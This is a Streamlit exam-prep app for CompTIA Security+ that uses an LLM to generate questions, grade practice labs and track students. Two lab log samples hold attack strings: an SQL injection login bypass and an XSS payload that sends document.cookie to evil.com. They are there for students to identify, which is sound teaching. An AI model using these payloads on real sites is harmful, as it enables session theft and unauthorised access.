import streamlit as st
import os
import time
import random
import urllib.parse
import json
from datetime import datetime
from dotenv import load_dotenv
from langchain_groq import ChatGroq
from langchain_huggingface import HuggingFaceEmbeddings
from langchain_community.vectorstores import FAISS
from langchain_core.prompts import PromptTemplate
from langchain_core.output_parsers import StrOutputParser

# 1. PAGE CONFIGURATION
load_dotenv()
st.set_page_config(page_title="Cyber Punk University", page_icon="🛡️", layout="wide")

# ==========================================
# DATABASE & TRACKING LOGIC
# ==========================================
DB_FILE = "study_logs.json"

def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_db(data):
    with open(DB_FILE, 'w') as f:
        json.dump(data, f, indent=4)

def ensure_user_exists(user):
    db = load_db()
    if user not in db:
        db[user] = {
            "time_spent_sec": 0, 
            "logs": [], 
            "weak_topics": [], 
            "current_score": "0 / 0",
            "has_completed_practice": False,
            "timed_scores": []
        }
        save_db(db)
    return db

def log_event(user, event_type, notes, topic=None):
    db = ensure_user_exists(user)
    timestamp = datetime.now().strftime("%Y-%m-%d %I:%M %p")
    db[user]["logs"].insert(0, {"timestamp": timestamp, "event": event_type, "notes": notes})
    if topic and topic not in db[user]["weak_topics"]:
        db[user]["weak_topics"].append(topic)
    save_db(db)

def ping_time_tracker(user):
    if "last_ping" in st.session_state:
        elapsed = time.time() - st.session_state.last_ping
        if 0 < elapsed < 3600: 
            db = ensure_user_exists(user)
            db[user]["time_spent_sec"] += elapsed
            save_db(db)
    st.session_state.last_ping = time.time()

def update_live_score(user, correct, total):
    db = load_db()
    if user in db:
        db[user]["current_score"] = f"{correct} / {total}"
        save_db(db)

def mark_practice_complete(user):
    db = load_db()
    if user in db:
        db[user]["has_completed_practice"] = True
        save_db(db)

def save_timed_score(user, score_str):
    db = load_db()
    if user in db:
        db[user]["timed_scores"].append(score_str)
        save_db(db)

# ==========================================
# UI COMPONENTS
# ==========================================
def render_footer():
    st.markdown("---")
    st.markdown("<p style='text-align: center; color: grey;'>Created and Powered By Monique Bruce</p>", unsafe_allow_html=True)

def check_password():
    def password_entered():
        user = st.session_state["username"].strip().lower()
        pw = st.session_state["password"].strip()
        
        if user in st.secrets.get("passwords", {}) and pw == st.secrets["passwords"].get(user):
            st.session_state["password_correct"] = True
            st.session_state["current_user"] = user
            del st.session_state["password"]
            if user != "admin":
                st.session_state.last_ping = time.time()
                log_event(user, "Logged In", "Student initiated training session.")
        else:
            st.session_state["password_correct"] = False

    if "password_correct" not in st.session_state or not st.session_state["password_correct"]:
        st.markdown("<br><br>", unsafe_allow_html=True)
        spacer_left, col_img, col_form, spacer_right = st.columns([1, 2, 2, 1])
        
        with col_img:
            image_name = "logo.jpeg"
            if os.path.exists(image_name):
                st.image(image_name, use_container_width=True)
            else:
                st.info("Logo Placeholder (Ensure logo.jpeg is in your GitHub Repo)")

        with col_form:
            st.title("🛡️ Cyber Punk University")
            st.subheader("Secure Access Portal")
            st.text_input("Username", key="username")
            st.text_input("Password", type="password", key="password")
            st.button("Authorize Access", on_click=password_entered, use_container_width=True)
            
            if "password_correct" in st.session_state and not st.session_state["password_correct"]:
                st.error("🚫 Access Denied: Invalid Credentials.")
                
        st.markdown("<br><br><br>", unsafe_allow_html=True)
        render_footer()
        return False
        
    return True

# ==========================================
# RESOURCE LOADING (WITH DIAGNOSTICS)
# ==========================================
# Added a visible spinner so you know it hasn't frozen!
@st.cache_resource(show_spinner="Downloading AI Models & Database (This may take 1-2 minutes on the first boot...)")
def load_resources():
    api_key = st.secrets.get("GROQ_API_KEY") or os.getenv("GROQ_API_KEY")
    if not api_key:
        st.error("🔑 GROQ_API_KEY is missing in Streamlit Secrets!")
        return None, None
        
    if not os.path.exists("faiss_index"):
        st.error("📁 Error: Could not find the 'faiss_index' folder in your GitHub repository!")
        return None, None

    try:
        embeddings = HuggingFaceEmbeddings(model_name="sentence-transformers/all-MiniLM-L6-v2")
        vectorstore = FAISS.load_local("faiss_index", embeddings, allow_dangerous_deserialization=True)
        llm = ChatGroq(temperature=0, model_name="llama-3.3-70b-versatile", groq_api_key=api_key)
        return vectorstore, llm
    except Exception as e:
        st.error(f"⚠️ Critical AI Initialization Error: {e}")
        return None, None

def get_adaptive_question(llm, raw_text, diff, weaknesses=""):
    template = """
    Extract ONE CompTIA Security+ question EXACTLY as written. 
    DIFFICULTY TARGET: {difficulty}
    KNOWN STUDENT WEAKNESSES: {weaknesses}
    (If the RAW TEXT relates to these weaknesses, heavily prioritize generating a question about it).
    If the text is a disclaimer or doesn't match, return: SKIP.
    RAW TEXT: {raw_text}
    FORMAT:
    QUESTION: [text]
    A: [text]
    B: [text]
    C: [text]
    D: [text]
    CORRECT: [A, B, C, or D]
    CRITICAL INSTRUCTION: Stop generating text immediately after providing the single CORRECT letter.
    """
    prompt = PromptTemplate.from_template(template)
    chain = prompt | llm | StrOutputParser()
    return chain.invoke({"raw_text": raw_text[:1200], "difficulty": diff, "weaknesses": weaknesses})

def get_tutor_feedback(llm, question, user_ans, correct_letter, is_right, diff):
    result_text = "Correct" if is_right else "Incorrect"
    template = """
    You are an expert Security+ tutor. 
    Question: {question}
    Student Choice: {user_ans}
    Correct Answer: {correct_letter}
    Result: {result}
    Level: {difficulty}
    Provide a smooth, beginner-friendly explanation using a real-world analogy if the student is struggling.
    """
    prompt = PromptTemplate.from_template(template)
    chain = prompt | llm | StrOutputParser()
    return chain.invoke({"question": question, "user_ans": user_ans, "correct_letter": correct_letter, "result": result_text, "difficulty": diff})

def get_video_topic(llm, question):
    template = "Analyze this Security+ question and extract the ONE core concept in 2 to 4 words. Question: {question}\nOutput ONLY the short topic name."
    prompt = PromptTemplate.from_template(template)
    chain = prompt | llm | StrOutputParser()
    return chain.invoke({"question": question})

def grade_pbq(llm, pbq_title, pbq_scenario, user_answers):
    template = """
    You are a friendly, encouraging CompTIA PBQ Grader.
    PBQ Title: {title}
    Scenario: {scenario}
    Student's Submitted Answers: {answers}
    Task:
    1. Tell the student if they got the configuration completely right, partially right, or wrong.
    2. Explain the "Why" using simple terms.
    3. Provide the definitive correct configuration at the end.
    CRITICAL INSTRUCTION:
    If the student got EVERY single part 100% correct, you MUST put the exact phrase "[PASSED]" at the very end of your response. 
    If they got ANYTHING wrong (even partially), you MUST put the exact phrase "[FAILED]" at the very end of your response.
    """
    prompt = PromptTemplate.from_template(template)
    chain = prompt | llm | StrOutputParser()
    return chain.invoke({"title": pbq_title, "scenario": pbq_scenario, "answers": str(user_answers)})

# ==========================================
# PBQ DATABASE
# ==========================================
PBQ_DB = {
    1: {"topic": "Network Ports", "title": "Port Configuration", "desc": "Match the correct default port number to the network service.", "type": "match", "keys": ["SSH", "HTTPS", "RDP", "DNS"], "options": ["22", "23", "53", "80", "443", "3389"]},
    2: {"topic": "Multifactor Authentication", "title": "Authentication Factors", "desc": "Categorize the MFA security factors.", "type": "match", "keys": ["Password", "Smartcard", "Retina Scan", "PIN"], "options": ["Something you know", "Something you have", "Something you are", "Somewhere you are"]},
    3: {"topic": "Malware Types", "title": "Malware Identification", "desc": "Match the malicious behavior to the correct malware type.", "type": "match", "keys": ["Encrypts files and demands payment", "Hides deep in the OS kernel", "Self-replicates across the network", "Disguises itself as legitimate software"], "options": ["Ransomware", "Rootkit", "Worm", "Trojan", "Spyware"]},
    4: {"topic": "Incident Response Phases", "title": "Incident Response Lifecycle", "desc": "Select the correct phase of Incident Response in order.", "type": "order", "keys": ["Step 1", "Step 2", "Step 3", "Step 4"], "options": ["Preparation", "Identification", "Containment", "Eradication", "Recovery", "Lessons Learned"]},
    5: {"topic": "Cryptography", "title": "Cryptography Types", "desc": "Classify the encryption algorithm as Symmetric or Asymmetric.", "type": "match", "keys": ["AES", "RSA", "DES", "ECC"], "options": ["Symmetric", "Asymmetric", "Hashing"]},
    6: {"topic": "Cloud Deployment Models", "title": "Cloud Deployment Models", "desc": "Classify the service as IaaS, PaaS, or SaaS.", "type": "match", "keys": ["AWS EC2 (Virtual Servers)", "Salesforce (Web CRM)", "Google App Engine", "Microsoft Azure VMs"], "options": ["Infrastructure as a Service (IaaS)", "Platform as a Service (PaaS)", "Software as a Service (SaaS)"]},
    7: {"topic": "Firewall Rules", "title": "Basic Firewall Rule", "desc": "Create a rule to strictly BLOCK web traffic (HTTP) coming from the IP 192.168.1.50.", "type": "firewall"},
    8: {"topic": "RAID Configuration", "title": "RAID Configuration", "desc": "Select the best RAID setup for the given business scenario.", "type": "match", "keys": ["High Performance, Zero Fault Tolerance", "Exact Mirroring (Redundancy)", "Striping with Parity (Min 3 drives)"], "options": ["RAID 0", "RAID 1", "RAID 5", "RAID 10"]},
    9: {"topic": "SQL Injection", "title": "Log Analysis: Database Attack", "desc": "Look at the web log and identify what type of attack is happening.", "type": "log", "log": '10.0.0.5 - - [10/Oct] "GET /login.php?user=admin\' OR \'1\'=\'1&pass=123 HTTP/1.1" 200 4321', "options": ["SQL Injection", "Cross-Site Scripting (XSS)", "Buffer Overflow", "DDoS"]},
    10: {"topic": "Cross-Site Scripting XSS", "title": "Log Analysis: Malicious Script", "desc": "Analyze the log and identify the attack vector targeting user browsers.", "type": "log", "log": '192.168.1.10 - - [12/Oct] "POST /comment.php?body=<script>fetch(\'http://evil.com/?cookie=\'+document.cookie)</script> HTTP/1.1" 200', "options": ["Cross-Site Scripting (XSS)", "SQL Injection", "Command Injection", "CSRF"]},
    11: {"topic": "Digital Certificates PKI", "title": "Digital Certificates", "desc": "Match the PKI component to its definition.", "type": "match", "keys": ["Used to encrypt data sent to a server", "Kept secret by the server to decrypt data", "A list of revoked/bad certificates"], "options": ["Public Key", "Private Key", "CRL (Certificate Revocation List)", "CSR"]},
    12: {"topic": "Firewall ACL Troubleshooting", "title": "Advanced ACL Troubleshooting", "desc": "Review the firewall rules. A user at 10.1.1.5 cannot reach the secure website (HTTPS) at 10.2.2.10. Which rule number is causing the block?", "type": "log", "log": "Rule 1: DENY IP 10.1.1.0/24 to 10.2.2.0/24 PORT 80\nRule 2: DENY IP ANY to 10.2.2.10 PORT 443\nRule 3: ALLOW IP 10.1.1.0/24 to ANY PORT ANY\nRule 4: DENY ALL ALL", "options": ["Rule 1", "Rule 2", "Rule 3", "Rule 4"]}
}

# ==========================================
# ADMIN DASHBOARD
# ==========================================
def run_admin_dashboard():
    st.title("👨🏾‍🏫 Instructor Command Center")
    authorized_guests = ["guest1", "guest2"]
    
    db = load_db()
    tab1, tab2 = st.tabs(["📊 Performance Matrix", "📋 Live Session Logs"])
    
    with tab1:
        st.write(f"### Monitoring Active Nodes: {len(authorized_guests)}")
        cols = st.columns(len(authorized_guests))
        for idx, student in enumerate(authorized_guests):
            data = db.get(student, {"time_spent_sec": 0, "current_score": "0 / 0", "weak_topics": [], "has_completed_practice": False, "timed_scores": []})
            total_hrs = data["time_spent_sec"] / 3600
            
            with cols[idx]:
                st.markdown(f"#### 🧑🏾‍💻 Node: `{student}`")
                
                status = "✅ Unlocked" if data["has_completed_practice"] else "🔒 Locked"
                st.write(f"**Exam Status:** {status}")
                
                st.metric("Engagement Time", f"{total_hrs:.2f} Hours")
                st.metric("Live Practice Progress", data["current_score"])
                
                latest_timed = data["timed_scores"][-1] if data["timed_scores"] else "Not Taken"
                st.metric("Best Timed Exam Score", latest_timed)
                
                st.write("**Identified Knowledge Gaps:**")
                if data["weak_topics"]:
                    for topic in list(set(data["weak_topics"]))[-5:]: 
                        st.error(f"⚠️ {topic}")
                else: 
                    st.success("Clear - No gaps detected.")
                
                st.markdown("---")
                if st.button(f"🗑️ Purge {student} History", key=f"del_{student}"):
                    if student in db: del db[student]
                    save_db(db)
                    st.rerun()
    
    with tab2:
        for student in authorized_guests:
            st.write(f"**Recent Telemetry for {student}:**")
            logs = db.get(student, {}).get("logs", [])
            if logs:
                for log in logs[:15]:
                    st.text(f"[{log['timestamp']}] {log['event']} -> {log['notes']}")
            else: st.info(f"No active data for {student}.")

# ==========================================
# STUDENT SIMULATOR (Adaptive Engine & Exams)
# ==========================================
def run_student_simulator(vs, llm):
    user = st.session_state["current_user"]
    ping_time_tracker(user)
    db = load_db()
    user_data = db.get(user, {})
    has_completed_practice = user_data.get("has_completed_practice", False)
    user_weaknesses = ", ".join(list(set(user_data.get("weak_topics", [])))[-5:])

    REQUIRED_KEYS = [
        'app_mode', 'all_docs', 'db_idx', 'display_idx', 'correct_count', 
        'wrong_count', 'streak', 'difficulty', 'current_q', 'phase', 
        'feedback', 'user_choice', 'is_right', 'rehab_topic', 
        'pbq_feedback', 'current_pbq_id',
        'te_active', 'te_start_time', 'te_idx', 'te_correct', 'te_wrong_topics', 'te_pbqs', 'te_phase'
    ]
    
    if any(key not in st.session_state for key in REQUIRED_KEYS):
        st.session_state.clear()
        docs = vs.similarity_search("Security+", k=120)
        random.shuffle(docs)
        st.session_state.all_docs = docs
        st.session_state.db_idx = 0         
        st.session_state.display_idx = 1    
        st.session_state.correct_count = 0  
        st.session_state.wrong_count = 0    
        st.session_state.streak = 0
        st.session_state.difficulty = "NORMAL"
        st.session_state.current_q = None   
        st.session_state.phase = "answering" 
        st.session_state.feedback = ""
        st.session_state.user_choice = None
        st.session_state.is_right = False
        st.session_state.rehab_topic = ""
        st.session_state.app_mode = "Adaptive Simulator"
        st.session_state.pbq_feedback = ""
        st.session_state.current_pbq_id = None
        
        st.session_state.te_active = False
        st.session_state.te_start_time = 0
        st.session_state.te_idx = 1
        st.session_state.te_correct = 0
        st.session_state.te_wrong_topics = []
        st.session_state.te_pbqs = []
        st.session_state.te_phase = "answering"
        
        st.session_state["password_correct"] = True
        st.session_state["current_user"] = user
        st.session_state.last_ping = time.time()

    with st.sidebar:
        st.header("🧭 Navigation")
        st.radio("Training Environment:", ["Adaptive Simulator", "PBQ Hands-on Lab", "Timed Certification Exam"], key="app_mode")
        st.markdown("---")
        
        if st.session_state.app_mode == "Adaptive Simulator":
            st.header("📊 Practice Progress")
            st.write(f"**Question:** {st.session_state.display_idx} / 90")
            st.success(f"✅ Success Rate: {st.session_state.correct_count}")
            st.error(f"❌ Missed: {st.session_state.wrong_count}")
            
            st.markdown("---")
            st.header("📺 Quick Review Topics")
            topics = ["1.0 General Concepts", "2.0 Threats & Mitigations", "3.0 Architecture", "4.0 Security Operations", "5.0 Program Management"]
            for topic in topics:
                query = urllib.parse.quote(f"Professor Messer SY0-701 {topic}")
                st.markdown(f"- [{topic}](https://www.youtube.com/results?search_query={query})")
                
            st.markdown("---")
            if st.button("🔄 Restart Practice Module"):
                update_live_score(user, 0, 0)
                log_event(user, "Module Reset", "Student restarted practice.")
                keys_to_clear = ['db_idx', 'display_idx', 'correct_count', 'wrong_count', 'streak', 'current_q', 'phase']
                for k in keys_to_clear: st.session_state.pop(k, None)
                st.rerun()

    st.subheader(f"Cyber Punk Training Module: {st.session_state.app_mode}")

    if st.session_state.app_mode == "PBQ Hands-on Lab":
        st.write("Select a scenario below. Difficulty increases from 1 to 12.")
        
        pbq_id = st.selectbox("Select PBQ Scenario:", list(PBQ_DB.keys()), format_func=lambda x: f"PBQ {x}: {PBQ_DB[x]['title']} (Level {x})")
        pbq = PBQ_DB[pbq_id]
        
        if st.session_state.current_pbq_id != pbq_id:
            st.session_state.current_pbq_id = pbq_id
            st.session_state.pbq_feedback = ""
            if 'keys' in pbq: st.session_state.pbq_keys = random.sample(pbq['keys'], len(pbq['keys']))
            if 'options' in pbq: st.session_state.pbq_opts = random.sample(pbq['options'], len(pbq['options']))
        
        st.info(f"**Scenario:** {pbq['desc']}")
        user_submission = {}
        
        with st.form(f"pbq_form_{pbq_id}"):
            if pbq['type'] in ["match", "order", "log"]:
                if 'log' in pbq: st.code(pbq['log'], language='bash')
                if 'options' in pbq:
                    shuffled_opts = st.session_state.get('pbq_opts', pbq['options'])
                    st.write("### 🗂️ Word Bank")
                    st.info(" | ".join(shuffled_opts))
                    st.write("---")
                if 'keys' in pbq:
                    col1, col2 = st.columns(2)
                    shuffled_keys = st.session_state.get('pbq_keys', pbq['keys'])
                    for i, key in enumerate(shuffled_keys):
                        with (col1 if i % 2 == 0 else col2):
                            user_submission[key] = st.selectbox(f"{key}:", ["-- Select --"] + shuffled_opts)
                else:
                    if 'options' in pbq:
                        shuffled_opts = st.session_state.get('pbq_opts', pbq['options'])
                        user_submission['Answer'] = st.selectbox("Select the correct finding:", ["-- Select --"] + shuffled_opts)
            elif pbq['type'] == "firewall":
                col1, col2, col3, col4 = st.columns(4)
                user_submission['Action'] = col1.selectbox("Action", ["-- Select --", "ALLOW", "DENY"])
                user_submission['Protocol'] = col2.selectbox("Protocol", ["-- Select --", "TCP", "UDP", "HTTP", "ANY"])
                user_submission['Source IP'] = col3.text_input("Source IP (e.g., 192.168.x.x)")
                user_submission['Dest Port'] = col4.selectbox("Dest Port", ["-- Select --", "22", "53", "80", "443", "ANY"])

            submit_pbq = st.form_submit_button("Submit PBQ for Grading")
        
        if submit_pbq:
            if any(val == "-- Select --" or val == "" for val in user_submission.values()):
                st.error("⚠️ Please select an answer for all fields before submitting.")
            else:
                with st.spinner("AI Tutor is grading your PBQ..."):
                    st.session_state.pbq_feedback = grade_pbq(llm, pbq['title'], pbq['desc'], user_submission)
                    
                    passed = "[PASSED]" in st.session_state.pbq_feedback
                    if passed: log_event(user, "PBQ Passed", f"Aced {pbq['title']}")
                    else: log_event(user, "PBQ Failed", f"Struggled with {pbq['title']}", pbq['topic'])
        
        if st.session_state.pbq_feedback:
            st.markdown("---")
            raw_feedback = st.session_state.pbq_feedback
            passed = "[PASSED]" in raw_feedback
            failed = "[FAILED]" in raw_feedback
            clean_feedback = raw_feedback.replace("[PASSED]", "").replace("[FAILED]", "").strip()
            
            st.warning("🤖 **AI PBQ Evaluation & Grade:**")
            st.write(clean_feedback)
            
            if failed:
                topic = pbq.get('topic', 'CompTIA Security+')
                query = urllib.parse.quote(f"Professor Messer SY0-701 {topic}")
                st.error("🛑 It looks like you missed some parts of this PBQ.")
                st.markdown(f"### 📺 [Click Here to Watch a Review Lesson on '{topic}'](https://www.youtube.com/results?search_query={query})")
            elif passed:
                st.success("🏆 Perfect Score! Excellent job on this PBQ.")

            if st.button("Clear Feedback & Try Again"):
                st.session_state.pbq_feedback = ""
                st.session_state.current_pbq_id = None 
                st.rerun()

    elif st.session_state.app_mode == "Adaptive Simulator":
        st.write(f"*(Operating at {st.session_state.difficulty} Difficulty Level)*")
        
        if st.session_state.streak >= 3: st.session_state.difficulty = "HARD"
        elif st.session_state.streak <= -3: st.session_state.difficulty = "EASY"
        else: st.session_state.difficulty = "NORMAL"

        if st.session_state.display_idx > 90:
            st.balloons()
            st.success(f"🎉 Practice Exam Finished! Final Score: {st.session_state.correct_count} / 90")
            if st.button("Log Score, Unlock Real Exam, & Restart"):
                log_event(user, "Practice Completed", f"Score: {st.session_state.correct_count}/90")
                mark_practice_complete(user)
                st.session_state.clear()
                st.rerun()
            return

        if st.session_state.current_q is None:
            with st.spinner("System is finding your next objective (Analyzing Weaknesses)..."):
                while st.session_state.db_idx < len(st.session_state.all_docs):
                    time.sleep(1.2)
                    raw_content = st.session_state.all_docs[st.session_state.db_idx].page_content
                    formatted = get_adaptive_question(llm, raw_content, st.session_state.difficulty, user_weaknesses)
                    if "SKIP" not in formatted and "QUESTION:" in formatted:
                        try:
                            q_text = formatted.split("QUESTION:")[1].split("A:")[0].strip()
                            a_opt = formatted.split("A:")[1].split("B:")[0].strip()
                            b_opt = formatted.split("B:")[1].split("C:")[0].strip()
                            c_opt = formatted.split("C:")[1].split("D:")[0].strip()
                            d_opt = formatted.split("D:")[1].split("CORRECT:")[0].strip()
                            correct_letter = formatted.split("CORRECT:")[1].strip()[0].upper()
                            
                            st.session_state.current_q = {
                                "text": q_text, "options": [f"A: {a_opt}", f"B: {b_opt}", f"C: {c_opt}", f"D: {d_opt}"], "correct_letter": correct_letter
                            }
                            break 
                        except Exception: st.session_state.db_idx += 1 
                    else: st.session_state.db_idx += 1 

        if st.session_state.current_q is None:
            st.error("Ran out of study material.")
            return

        cq = st.session_state.current_q
        
        if st.session_state.phase == "answering":
            st.info(cq["text"])
            selected_option = st.radio("Select your defensive response:", cq["options"], index=None)

            if st.button("Submit Response"):
                if selected_option is None: st.warning("⚠️ Please select an answer.")
                else:
                    user_letter = selected_option.split(":")[0].strip()
                    is_right = (user_letter == cq["correct_letter"])
                    
                    if is_right:
                        st.session_state.correct_count += 1
                        st.session_state.streak = st.session_state.streak + 1 if st.session_state.streak > 0 else 1
                    else:
                        st.session_state.wrong_count += 1
                        st.session_state.streak = st.session_state.streak - 1 if st.session_state.streak < 0 else -1
                    
                    st.session_state.user_choice = selected_option
                    st.session_state.is_right = is_right
                    
                    update_live_score(user, st.session_state.correct_count, st.session_state.display_idx)
                    
                    with st.spinner("AI Tutor is analyzing your response..."):
                        st.session_state.feedback = get_tutor_feedback(llm, cq["text"], selected_option, cq["correct_letter"], is_right, st.session_state.difficulty)
                    st.session_state.phase = "reviewing"
                    st.rerun()

        elif st.session_state.phase == "reviewing":
            st.info(cq["text"])
            st.radio("Your response:", cq["options"], index=cq["options"].index(st.session_state.user_choice), disabled=True)
            st.markdown("---")
            if st.session_state.is_right: st.success(f"✅ Correct! The answer is {cq['correct_letter']}.")
            else: st.error(f"❌ Incorrect. The correct answer was {cq['correct_letter']}.")
            
            st.warning("🤖 **System AI Analysis:**")
            st.write(st.session_state.feedback)
            st.markdown("<br>", unsafe_allow_html=True)
            
            if st.button("Next Objective ➡️"):
                if st.session_state.streak <= -3:
                    with st.spinner("Preparing required study timeout..."):
                        topic = get_video_topic(llm, cq["text"])
                        st.session_state.rehab_topic = topic
                        log_event(user, "Timeout Triggered", "Failed 3 in a row", topic)
                        
                    st.session_state.phase = "video_rehab"
                    st.rerun()
                else:
                    st.session_state.db_idx += 1        
                    st.session_state.display_idx += 1   
                    st.session_state.current_q = None   
                    st.session_state.phase = "answering"
                    st.rerun()

        elif st.session_state.phase == "video_rehab":
            st.error("🛑 Study Timeout Triggered: You've missed 3 questions in a row.")
            st.subheader(f"📚 Recommended Review Topic: **{st.session_state.rehab_topic}**")
            
            query = urllib.parse.quote(f"Professor Messer SY0-701 {st.session_state.rehab_topic}")
            st.markdown(f"### 📺 [Click Here to Search YouTube for '{st.session_state.rehab_topic}' Lessons](https://www.youtube.com/results?search_query={query})")
            
            user_done = st.text_input("Type **done** when you have finished reviewing:")
            if user_done.strip().lower() == "done":
                st.success("Great job reviewing! Let's get back into the module.")
                if st.button("Resume Module ➡️"):
                    log_event(user, "Completed Rehab", f"Reviewed {st.session_state.rehab_topic}")
                    st.session_state.streak = 0
                    st.session_state.db_idx += 1        
                    st.session_state.display_idx += 1   
                    st.session_state.current_q = None   
                    st.session_state.phase = "answering"
                    st.rerun()

    elif st.session_state.app_mode == "Timed Certification Exam":
        if not has_completed_practice:
            st.error("🔒 **EXAM LOCKED**")
            st.warning("You must complete all 90 questions in the Adaptive Simulator at least once to unlock the real certification exam simulator.")
            return

        if not st.session_state.te_active:
            st.write("### 🚨 Official Certification Simulator")
            st.write("**Rules:**")
            st.write("- **90 Minutes** total time limit.")
            st.write("- **90 Questions** (87 Multiple Choice, 3 PBQs at the end).")
            st.write("- **No Feedback** until the exam is submitted.")
            st.write("- If you fail, the AI will document your weak topics and force you to practice them in the Adaptive Simulator.")
            
            if st.button("🚀 Start Timed Exam Now"):
                st.session_state.te_active = True
                st.session_state.te_start_time = time.time()
                st.session_state.te_idx = 1
                st.session_state.te_correct = 0
                st.session_state.te_wrong_topics = []
                st.session_state.te_pbqs = random.sample(list(PBQ_DB.keys()), 3) 
                st.session_state.te_current_q = None
                st.session_state.te_phase = "answering"
                log_event(user, "Started Timed Exam", "90 Minute timer initiated.")
                st.rerun()
        else:
            elapsed = time.time() - st.session_state.te_start_time
            remaining = max(0, 5400 - elapsed)
            mins, secs = divmod(int(remaining), 60)
            
            col1, col2 = st.columns([3, 1])
            with col1: st.progress(st.session_state.te_idx / 90.0)
            with col2: st.error(f"⏱️ Time Remaining: **{mins:02d}:{secs:02d}**")
            
            if remaining <= 0:
                st.error("⏰ Time's Up! Auto-submitting exam.")
                st.session_state.te_idx = 91 
                time.sleep(2)
                st.rerun()

            if st.session_state.te_idx <= 87:
                st.write(f"**Question {st.session_state.te_idx} of 90 (Multiple Choice)**")
                
                if st.session_state.te_current_q is None:
                    with st.spinner("Loading next objective..."):
                        while st.session_state.db_idx < len(st.session_state.all_docs):
                            raw_content = st.session_state.all_docs[st.session_state.db_idx].page_content
                            formatted = get_adaptive_question(llm, raw_content, "NORMAL", "")
                            if "SKIP" not in formatted and "QUESTION:" in formatted:
                                try:
                                    q_text = formatted.split("QUESTION:")[1].split("A:")[0].strip()
                                    a_opt = formatted.split("A:")[1].split("B:")[0].strip()
                                    b_opt = formatted.split("B:")[1].split("C:")[0].strip()
                                    c_opt = formatted.split("C:")[1].split("D:")[0].strip()
                                    d_opt = formatted.split("D:")[1].split("CORRECT:")[0].strip()
                                    correct_letter = formatted.split("CORRECT:")[1].strip()[0].upper()
                                    
                                    st.session_state.te_current_q = {
                                        "text": q_text, "options": [f"A: {a_opt}", f"B: {b_opt}", f"C: {c_opt}", f"D: {d_opt}"], "correct_letter": correct_letter
                                    }
                                    break 
                                except Exception: st.session_state.db_idx += 1 
                            else: st.session_state.db_idx += 1 
                
                if st.session_state.te_current_q is None:
                    st.error("Exam database exhausted. Please restart.")
                    return

                cq = st.session_state.te_current_q
                st.info(cq["text"])
                selected_option = st.radio("Select your response:", cq["options"], index=None, key=f"te_radio_{st.session_state.te_idx}")
                
                if st.button("Submit & Continue ➡️"):
                    if selected_option is None: st.warning("⚠️ You must select an answer to proceed.")
                    else:
                        user_letter = selected_option.split(":")[0].strip()
                        if user_letter == cq["correct_letter"]:
                            st.session_state.te_correct += 1
                        else:
                            with st.spinner("Saving..."):
                                topic = get_video_topic(llm, cq["text"])
                                st.session_state.te_wrong_topics.append(topic)
                        
                        st.session_state.te_idx += 1
                        st.session_state.db_idx += 1
                        st.session_state.te_current_q = None
                        st.rerun()

            elif st.session_state.te_idx <= 90:
                pbq_number = st.session_state.te_idx - 87
                st.write(f"**Question {st.session_state.te_idx} of 90 (Performance-Based Question {pbq_number}/3)**")
                
                current_pbq_id = st.session_state.te_pbqs[pbq_number - 1]
                pbq = PBQ_DB[current_pbq_id]
                
                st.info(f"**Scenario:** {pbq['desc']}")
                
                user_submission = {}
                with st.form(f"te_pbq_form_{st.session_state.te_idx}"):
                    if pbq['type'] in ["match", "order", "log"]:
                        if 'log' in pbq: st.code(pbq['log'], language='bash')
                        if 'options' in pbq:
                            st.write("### 🗂️ Word Bank")
                            st.info(" | ".join(pbq['options']))
                            st.write("---")
                        if 'keys' in pbq:
                            col1, col2 = st.columns(2)
                            for i, key in enumerate(pbq['keys']):
                                with (col1 if i % 2 == 0 else col2):
                                    user_submission[key] = st.selectbox(f"{key}:", ["-- Select --"] + pbq['options'])
                        else:
                            if 'options' in pbq:
                                user_submission['Answer'] = st.selectbox("Select the correct finding:", ["-- Select --"] + pbq['options'])
                    elif pbq['type'] == "firewall":
                        c1, c2, c3, c4 = st.columns(4)
                        user_submission['Action'] = c1.selectbox("Action", ["-- Select --", "ALLOW", "DENY"])
                        user_submission['Protocol'] = c2.selectbox("Protocol", ["-- Select --", "TCP", "UDP", "HTTP", "ANY"])
                        user_submission['Source IP'] = c3.text_input("Source IP")
                        user_submission['Dest Port'] = c4.selectbox("Dest Port", ["-- Select --", "22", "53", "80", "443", "ANY"])

                    submit_pbq = st.form_submit_button("Submit PBQ & Continue ➡️")
                
                if submit_pbq:
                    if any(val == "-- Select --" or val == "" for val in user_submission.values()):
                        st.error("⚠️ Please configure all fields before submitting.")
                    else:
                        with st.spinner("Recording configuration..."):
                            feedback = grade_pbq(llm, pbq['title'], pbq['desc'], user_submission)
                            if "[PASSED]" in feedback:
                                st.session_state.te_correct += 1
                            else:
                                st.session_state.te_wrong_topics.append(pbq['topic'])
                                
                        st.session_state.te_idx += 1
                        st.rerun()

            else:
                score_str = f"{st.session_state.te_correct} / 90"
                passing_score = 75 
                passed = st.session_state.te_correct >= passing_score
                
                st.balloons() if passed else None
                st.markdown("## 🏁 Exam Completed")
                st.metric("Final Score", score_str)
                
                if passed:
                    st.success("🎉 **PASS!** You have met the requirements for certification. You are ready for the real exam!")
                    log_event(user, "Passed Timed Exam", f"Score: {score_str}")
                else:
                    st.error("🛑 **FAIL.** You did not meet the 75/90 threshold. The AI has documented your weaknesses.")
                    log_event(user, "Failed Timed Exam", f"Score: {score_str}")
                    st.write("### AI Knowledge Gap Analysis:")
                    st.write("The system has updated your profile. The Adaptive Simulator will now force you to practice the following topics:")
                    for w in list(set(st.session_state.te_wrong_topics)):
                        st.warning(f"⚠️ Needs Review: {w}")
                        log_event(user, "AI Weakness Logged", "From Timed Exam", w)
                
                save_timed_score(user, score_str)
                
                if st.button("Return to Dashboard"):
                    st.session_state.te_active = False
                    st.rerun()

# ==========================================
# MAIN EXECUTION THREAD
# ==========================================
if check_password():
    with st.sidebar:
        st.write(f"Authorized User: **{st.session_state['current_user']}**")
        if st.button("🚪 Terminate Session"):
            if st.session_state['current_user'] != "admin":
                log_event(st.session_state['current_user'], "Logout", "Session closed by user.")
            st.session_state.clear()
            st.rerun()

    if st.session_state["current_user"] == "admin":
        run_admin_dashboard()
    else:
        # HERE IS THE SAFETY NET FOR A BLANK PAGE!
        vs, llm = load_resources()
        if vs is not None and llm is not None: 
            run_student_simulator(vs, llm)
        else:
            st.error("⚠️ The App failed to load the AI Models. Please verify your faiss_index and GROQ_API_KEY.")
            
    render_footer()
